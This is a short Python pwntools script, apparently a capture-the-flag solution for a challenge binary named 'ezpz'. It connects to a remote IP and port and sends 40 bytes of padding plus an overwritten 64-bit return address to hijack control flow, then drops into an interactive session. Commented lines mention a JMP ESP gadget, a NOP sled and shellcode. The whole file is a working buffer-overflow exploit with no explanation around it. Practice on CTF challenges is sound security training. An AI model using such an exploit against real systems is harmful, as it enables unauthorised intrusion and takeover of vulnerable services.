from pwn import *
from pwn import p32, p64

ip = "3.110.66.92"
port = "30095"

p = remote(str(ip),int(port))
#p = process("./ezpz")
#gdb.attach(p, gdbscript='continue')

junk = b"A"*40

#? The JMP ESP instruction "0x625011af"
#? eip = "\xaf\x11\x50\x62"

eip = p64(0x004017ea)

#nops = "\x90" * 16
payload = junk + eip # + nops# + shellcode

p.recvline()
p.sendline(payload)
p.interactive()
